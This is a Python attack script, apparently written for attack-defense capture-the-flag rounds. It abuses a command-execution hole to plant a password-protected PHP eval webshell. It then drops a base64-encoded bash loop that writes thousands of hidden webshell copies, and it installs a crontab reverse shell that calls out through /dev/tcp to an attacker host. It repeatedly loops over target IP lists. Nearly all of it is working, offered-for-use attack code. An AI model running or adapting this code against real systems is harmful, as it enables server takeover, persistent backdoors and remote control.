#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2019/08/23 11:23
# @Author  : nealwe
# @File    : run.py


import re
import requests
from nealwe_web_lib import *
from multiprocessing import Pool, Process
import time
import random

salt = 'jspi_nealwe'
one_line_shell_file_name = ".~index.php"
# boom_shell_name = .${{i}}{one_line_shell_file_name}


def webshell_password(ip, salt):
    return md5_py3(md5_py3(ip) + salt)


def transshell(content):
    a = base64.b64encode(content.encode('utf-8'))
    return a.decode('utf-8')


def generate_one_line_shell(target_ip, target_port):
    '''
    不管是文件上传还是命令执行漏洞，都不管，这个函数就是单个的exp，目标是在所有机器上生成指定的一句话木马。
    形如：    <?php eval($_POST['f6307885d1d023b4d9843c59c57a6e00']);?>
    :param target_ip:
    :param target_port:
    :return:
    '''
    try:
        res = os.popen(r"""curl --connect-timeout 2 -i -s -k  -X $'POST' \
            -H $'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0' -H $'Content-Type: application/x-www-form-urlencoded' -H $'X-Forwarded-For: {target_ip}' -H $'Upgrade-Insecure-Requests: 1' \
            -b $'Webstorm-5ca54e3e=bfcc39c2-baf0-4dd6-b355-f9b2f80bf090; Phpstorm-66d4e5d8=4b6f2fcc-7a86-4c4d-8325-83f4a4391a62; Phpstorm-f32a562c=5488d4d4-8b45-4eec-bf60-f898cd1a984d; Webstorm-e8fabe92=adca1287-349f-4c11-8c8e-506e9cba638d' \
            --data-binary $'a=echo \"<?php eval(\$_POST[\'{password}\']);?>\">/var/www/html/{one_line_shell_file_name};cat {one_line_shell_file_name}' \
            $'http://{target_ip}:{target_port}/'""".format(target_ip=target_ip, target_port=target_port,
                                                           password=webshell_password(target_ip, salt),
                                                           one_line_shell_file_name=one_line_shell_file_name)).read()
        print(res)
    except:
        pass


def one_line_shell_to_boom_webshell(target_ip, target_port):
    '''
    用生成的一句话木马再写满整个磁盘
    :param target_ip:
    :param target_port:
    :return:
    '''
    url = f"http://{target_ip}:{target_port}/{one_line_shell_file_name}"
    password = webshell_password(target_ip, salt)

    text = "<?php @eval(\$_POST['{password}']);".format(password=password)
    # <?php eval($_POST['f6307885d1d023b4d9843c59c57a6e00']);?>
    bash_content = f"""#!/bin/bash
let i=0;
while [[ $i -le 10000 ]];
do 
    echo "{text}">.${{i}}{one_line_shell_file_name};
    echo "{text}">{one_line_shell_file_name};
    let i++;
done;"""
    bash_content = transshell(bash_content)
    cmd = "(echo " + bash_content + " | base64 -d) > /tmp/start.sh;chmod 777 /tmp/start.sh;/bin/bash /tmp/start.sh;"
    # eval($_POST['a']);
    data = {
        password: "system($_POST['nealwe']);",
        'nealwe': cmd
    }

    headers = """
        accept: application/json
        accept-encoding: gzip, deflate, br
        accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,und;q=0.6
        cache-control: no-cache
        cookie: sajssdk_2015_cross_new_user=nealwe; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22%24device_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22props%22%3A%7B%22%24latest_referrer%22%3A%22https%3A%2F%2Fwww.baidu.com%2Flink%22%2C%22%24latest_referrer_host%22%3A%22www.baidu.com%22%2C%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%7D%7D; __yadk_uid=SHaYDe5YT4zkd1unkCux2ymlNb502zBn; locale=zh-CN; Hm_lvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1566723580,1568852505,1568852788,1568853993; Hm_lpvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1568853993
        pragma: no-cache
        referer: https://127.0.0.1
        sec-fetch-mode: cors
        sec-fetch-site: same-origin
        user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
    """
    headers = headers_from_string_dict(headers)
    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=1)
        print(f"[%]boom {target_ip} :{res.status_code}")
    except Exception as e:
        print(f'[-]error: {target_ip}:{target_port}')


def one_line_shell_to_reverse_shell(target_ip, target_port, reverse_shell_ip, reverse_shell_port):
    '''
    根据生成的一句话木马进行反弹shell
    :param target_ip:
    :param target_port:
    :param reverse_shell_ip:
    :param reverse_shell_port:
    :return:
    '''
    url = f"http://{target_ip}:{target_port}/{one_line_shell_file_name}"
    password = webshell_password(target_ip, salt)

    # eval($_POST['a']);
    data = {
        password: "system($_POST['nealwe']);",
        'nealwe': r"""echo "*/1 * * * * bash -c 'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1';" |crontab""".format(
            reverse_shell_ip=reverse_shell_ip, reverse_shell_port=reverse_shell_port)
    }

    # # system($_POST['a']);
    # data = {
    #     password: r"""echo "*/1 * * * * bash -c 'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1';" |crontab""".format(reverse_shell_ip=reverse_shell_ip, reverse_shell_port=reverse_shell_port)
    # }

    headers = """
        accept: application/json
        accept-encoding: gzip, deflate, br
        accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,und;q=0.6
        cache-control: no-cache
        cookie: sajssdk_2015_cross_new_user=nealwe; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22%24device_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22props%22%3A%7B%22%24latest_referrer%22%3A%22https%3A%2F%2Fwww.baidu.com%2Flink%22%2C%22%24latest_referrer_host%22%3A%22www.baidu.com%22%2C%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%7D%7D; __yadk_uid=SHaYDe5YT4zkd1unkCux2ymlNb502zBn; locale=zh-CN; Hm_lvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1566723580,1568852505,1568852788,1568853993; Hm_lpvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1568853993
        pragma: no-cache
        referer: https://127.0.0.1
        sec-fetch-mode: cors
        sec-fetch-site: same-origin
        user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
    """
    headers = headers_from_string_dict(headers)
    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=2)
        print(res.status_code)
    except Exception as e:
        print(data)
        print(f'[-]error: {target_ip}:{target_port}')


def shell_is_alive(target_ip, target_port):
    '''
    监测shell的存活状态，活着返回True，Die返回False
    :param target_ip:
    :param target_port:
    :return:
    '''
    url = f"http://{target_ip}:{target_port}/{one_line_shell_file_name}"
    password = webshell_password(target_ip, salt)

    # eval($_POST['a']);
    data = {
        password: "system($_POST['nealwe']);",
        'nealwe': f"cat {one_line_shell_file_name}"
    }

    # # system($_POST['a']);
    # data = {
    #     password: r"""echo "*/1 * * * * bash -c 'bash -i >/dev/tcp/{reverse_shell_ip}/{reverse_shell_port} 0>&1';" |crontab""".format(reverse_shell_ip=reverse_shell_ip, reverse_shell_port=reverse_shell_port)
    # }

    headers = """
        accept: application/json
        accept-encoding: gzip, deflate, br
        accept-language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,und;q=0.6
        cache-control: no-cache
        cookie: sajssdk_2015_cross_new_user=nealwe; sensorsdata2015jssdkcross=%7B%22distinct_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22%24device_id%22%3A%2216d46e570f0e90-041a988676f9d6-38607501-1764000-16d46e570f1b3d%22%2C%22props%22%3A%7B%22%24latest_referrer%22%3A%22https%3A%2F%2Fwww.baidu.com%2Flink%22%2C%22%24latest_referrer_host%22%3A%22www.baidu.com%22%2C%22%24latest_traffic_source_type%22%3A%22%E8%87%AA%E7%84%B6%E6%90%9C%E7%B4%A2%E6%B5%81%E9%87%8F%22%2C%22%24latest_search_keyword%22%3A%22%E6%9C%AA%E5%8F%96%E5%88%B0%E5%80%BC%22%7D%7D; __yadk_uid=SHaYDe5YT4zkd1unkCux2ymlNb502zBn; locale=zh-CN; Hm_lvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1566723580,1568852505,1568852788,1568853993; Hm_lpvt_0c0e9d9b1e7d617b3e6842e85b9fb068=1568853993
        pragma: no-cache
        referer: https://127.0.0.1
        sec-fetch-mode: cors
        sec-fetch-site: same-origin
        user-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36
    """
    headers = headers_from_string_dict(headers)
    try:
        res = requests.post(url=url, headers=headers, data=data, timeout=2)
        if "<?php" in res.content:
            return True
        else:
            return False
    except Exception as e:
        return False


def run(target_ip, target_port, reverse_shell_ip, reverse_shell_port):
    global one_line_shell_file_name
    boom_shell_list = [one_line_shell_file_name, f'.1{one_line_shell_file_name}', f'.1000{one_line_shell_file_name}', f'.10000{one_line_shell_file_name}', f'.100000{one_line_shell_file_name}', f'.1000000{one_line_shell_file_name}', one_line_shell_file_name]
    for one_line_shell_file_name in boom_shell_list:
        try:
            if not shell_is_alive(target_ip, target_port):
                print(f"[+]using exp to generate one line shell...{target_ip}")
                generate_one_line_shell(target_ip, target_port)
                print(f"[+]using one line shell to boom webshell...{target_ip}")
                one_line_shell_to_boom_webshell(target_ip, target_port, )
                print(f"[+]using one line shell to reverse shell...{target_ip}")
                one_line_shell_to_reverse_shell(target_ip, target_port, reverse_shell_ip, reverse_shell_port)
                return True
            else:
                print(f"[+]using one line shell to boom webshell...{target_ip}")
                one_line_shell_to_boom_webshell(target_ip, target_port, )
                print(f"[+]using one line shell to reverse shell...{target_ip}")
                one_line_shell_to_reverse_shell(target_ip, target_port, reverse_shell_ip, reverse_shell_port)
                # one_line_shell_to_reverse_shell(target_ip, target_port, reverse_shell_ip, reverse_shell_port)
                return True
        except Exception as e:
            print(e)
            return False


if __name__ == '__main__':
    ips = list()

    full_ips = list()

    white_ips = list()

    # config

    # 生成IP的方法之一：
    # for i in range(0, 10):  # 0-9
    #     for j in range(0, 10):
    #         tmp_ip = f'172.17.{i}.{j}'
    #         ips.append(tmp_ip)
    #         full_ips.append(tmp_ip)

    ips = ip_list("127.0.0.1")

    target_port = 1180

    reverse_shell_ip = '172.20.0.1'

    reverse_shell_port = '8988'

    # white_ips.append(reverse_shell_ip)
    # white_ips.append('127.0.0.1')

    # config end


    print("[+]start...")
    round_num = 1
    while True:
        print(f"\n[+]round {round_num} start...")
        pp = Pool(20)
        for target_ip in ips:
            if target_ip in white_ips:
                print(f"[---]white target {target_ip}")
                continue
            pp.apply_async(run,
                           args=(target_ip, target_port, reverse_shell_ip, reverse_shell_port,))
        pp.close()
        pp.join()
        time.sleep(1)
        round_num += 1
